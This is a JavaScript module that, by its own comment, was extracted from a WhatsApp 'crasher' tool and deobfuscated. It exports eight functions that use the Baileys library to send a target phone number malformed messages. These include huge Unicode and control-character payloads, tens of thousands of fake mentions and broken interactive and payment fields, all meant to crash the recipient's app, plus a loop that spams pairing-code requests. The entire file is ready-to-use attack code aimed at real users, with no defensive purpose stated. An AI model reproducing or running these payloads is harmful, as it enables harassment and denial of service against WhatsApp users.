'use strict'
// Bug functions extracted from X-Crasher-Wa v1.0.0 (DanuZz) and deobfuscated
const fs    = require('fs')
const os    = require('os')
const path  = require('path')
const axios = require('axios')
const {
  proto,
  generateWAMessageFromContent,
  generateWAMessageContent,
  prepareWAMessageMedia,
  makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  relayMessage
} = require('@whiskeysockets/baileys')

const sleep  = ms => new Promise(r => setTimeout(r, ms))
const rand   = n  => Math.floor(Math.random() * n)
const jidOf  = n  => n.includes('@') ? n : n.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
const THUMB  = 'https://i.postimg.cc/y8v3djZd/Untitled-Project.jpg'

/* ---------- helpers ---------- */
async function fetchBuf(url) {
  const r = await axios.get(url, { responseType: 'arraybuffer' })
  return Buffer.from(r.data, 'binary')
}

async function imgMsg(url) {
  const { imageMessage } = await generateWAMessageContent(
    { image: { url } },
    { upload: undefined }
  )
  return imageMessage
}

function uptime() {
  const s = Math.floor(process.uptime())
  const h = Math.floor(s / 3600)
  const m = Math.floor((s % 3600) / 60)
  const r = s % 60
  return (h ? h + 'h ' : '') + (m ? m + 'm ' : '') + r + 's'
}

/* =========================================================
   1. ORDER MESSAGE BUG  (product card carrying the payload)
   ========================================================= */
async function orderBug(sock, target, text, amount = 999999) {
  const jid = jidOf(target)
  const thumb = await fetchBuf(THUMB)
  const msg = generateWAMessageFromContent(jid, {
    orderMessage: {
      productId: '1234567890',
      title: '',
      description: 'X-Crasher',
      currencyCode: 'IDR',
      message: text,
      priceAmount1000: amount,
      thumbnail: thumb,
      surface: 1,
      contextInfo: { mentionedJid: [jid] }
    }
  }, {})
  await sock.relayMessage(jid, msg.message, { messageId: msg.key.id })
}

/* =========================================================
   2. NEWSLETTER INVITE BUG  (77k-char subject)
   ========================================================= */
async function newsletterBug(sock, target) {
  const jid  = jidOf(target)
  const name = 'ꦾ'.repeat(77763) + '@1'.repeat(77777)

  const msg = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: '120363213745823409@newsletter',
          newsletterName: name,
          jpegThumbnail: '',
          caption: name,
          inviteExpiration: Date.now() + 999999999
        }
      }
    }
  }, { userJid: jid })

  await sock.relayMessage(jid, msg.message, {
    participant: { jid },
    messageId: msg.key.id
  })
}

/* =========================================================
   3. LOCATION / AD BUG  (interactive + external ad reply)
   ========================================================= */
async function locationBug(sock, target) {
  const jid = jidOf(target)
  const filler = '軎'.repeat(30000)

  const msg = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 11.11,
              degreesLongitude: -122.4194,
              name: filler,
              url: 'https://maps.google.com'.repeat(1),
              contextInfo: {
                externalAdReply: {
                  quotedAd: {
                    advertiserName: filler,
                    mediaType: 1,
                    jpegThumbnail: await fetchBuf(THUMB),
                    caption: filler
                  },
                  placeholderKey: {
                    remoteJid: 'status@broadcast',
                    fromMe: true,
                    id: 'ABCDEF123456'
                  }
                }
              },
              hasMediaAttachment: true
            }
          },
          body: { text: filler },
          nativeFlowMessage: {
            messageParamsJson: '{[',
            messageVersion: 3,
            buttons: [
              { name: 'review_and_pay', buttonParamsJson: '' },
              { name: 'review_and_pay', buttonParamsJson: JSON.stringify({ icon: 'DEFAULT', flow_cta: 'Pay', flow_message_version: '3' }) },
              { name: 'review_and_pay', buttonParamsJson: JSON.stringify({ icon: 'DEFAULT', flow_cta: 'Pay', flow_message_version: '3' }) }
            ]
          }
        }
      }
    }
  }, { userJid: jid })

  await sock.relayMessage(jid, msg.message, { messageId: msg.key.id })
}

/* =========================================================
   4. STICKER BUG  (fake sticker + 40k mentions)
   ========================================================= */
async function stickerBug(sock, target) {
  const jid = jidOf(target)

  const mentions = [jid, ...Array(40000).fill().map(
    () => '1' + rand(9999999999) + '@s.whatsapp.net'
  )]

  const payload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: 'https://mmg.whatsapp.net/v/t62.15575-24/x.enc',
          fileSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
          fileEncSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
          mediaKey: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
          mimetype: 'image/webp',
          directPath: '/v/t62.15575-24/x.enc',
          fileLength: 40000,
          mediaKeyTimestamp: 1700000000,
          firstFrameLength: 19904,
          firstFrameSidecar: 'AAAA',
          isAnimated: true,
          contextInfo: {
            mentionedJid: mentions,
            groupMentions: [],
            entryPointConversionSource: 'global_search_new_chat',
            entryPointConversionApp: 'whatsapp',
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  }

  const msg = generateWAMessageFromContent(jid, payload, {})

  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [{
      tag: 'meta',
      attrs: {},
      content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid } }] }]
    }]
  })
}

/* =========================================================
   5. STATUS MENTION BUG  (extended text w/ attribution)
   ========================================================= */
async function statusMentionBug(sock, target) {
  const jid = jidOf(target)

  const msg = generateWAMessageFromContent(jid, {
    extendedTextMessage: {
      contextInfo: { statusAttributionType: 'ATTRIBUTED' },
      text: 'ꦾ'.repeat(20000) + '💀',
      matchedText: 'ꦾ'.repeat(20000),
      groupInviteLinkType: 'ATTRIBUTED'
    }
  }, {})

  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id,
    participant: { jid }
  })
}

/* =========================================================
   6. DOCUMENT / JSON CRASH  (payment payloads, 75k chars)
   ========================================================= */
async function docCrashBug(sock, target) {
  const jid = jidOf(target)
  const thumb = await fetchBuf(THUMB)

  // two stacked crash payloads
  const p1 = JSON.stringify({
    request_type: 'payment',
    payload: '\x1a'.repeat(75000) + '\x10'.repeat(75000),
    version: 'x',
    crash_id: rand(999999999999999),
    experimental: true
  })
  const p2 = JSON.stringify({
    request_type: 'payment',
    payload: '𑆿'.repeat(10000) + '︅'.repeat(2306),
    version: 'x',
    crash_id: rand(999999999999999),
    experimental: true
  })

  const payment = { payment_message: p1 }

  const msg = generateWAMessageFromContent(jid, {
    documentMessage: {
      url: undefined,
      mimetype: 'application/pdf',
      fileName: 'x',
      fileLength: 10001535,
      pageCount: 1,
      caption: '',
      name: 'x',
      paramsJson: p2,
      payment_message: payment
    }
  }, {})

  await sock.relayMessage(jid, msg.message, { messageId: msg.key.id })
}

/* =========================================================
   7. FLOW RESPONSE BUG  (interactive response, 40k mentions)
   ========================================================= */
async function flowResponseBug(sock, target) {
  const jid = jidOf(target)

  await sock.relayMessage(jid, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: '💀', format: 'EXTENDED_TEXT' },
          nativeFlowResponseMessage: {
            name: 'galaxy_message',
            paramsJson: '\x00'.repeat(200000),
            version: 3
          },
          contextInfo: {
            mentionedJid: Array(40000).fill().map(
              () => '1' + rand(9999999999) + '@s.whatsapp.net'
            )
          }
        }
      }
    }
  }, { participant: { jid } })
}

/* =========================================================
   8. DEVICE / PAIRING SPAM  (opens N sockets, requests codes)
   ========================================================= */
async function pairingBug(sock, target, cycles = 10) {
  const number = jidOf(target).split('@')[0]
  const dir = './temp/' + number

  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })

  let ok = 0
  try {
    const { default: P } = require('pino')
    for (let i = 0; i < cycles; i++) {
      try {
        const { state } = await useMultiFileAuthState(dir)
        const { version } = await fetchLatestBaileysVersion()
        const s = makeWASocket({
          auth: state,
          version,
          logger: P({ level: 'silent' }),
          printQRInTerminal: false
        })
        const code = await s.requestPairingCode(number)
        ok++
        console.log('[pairing]', ok + '/' + cycles, number, code)
      } catch (e) {
        console.log('[pairing] fail', i, e.message)
      }
      await sleep(1500)
    }
  } finally {
    try { if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true }) } catch {}
  }
  return ok
}

module.exports = {
  orderBug,
  newsletterBug,
  locationBug,
  stickerBug,
  statusMentionBug,
  docCrashBug,
  flowResponseBug,
  pairingBug,
  uptime
}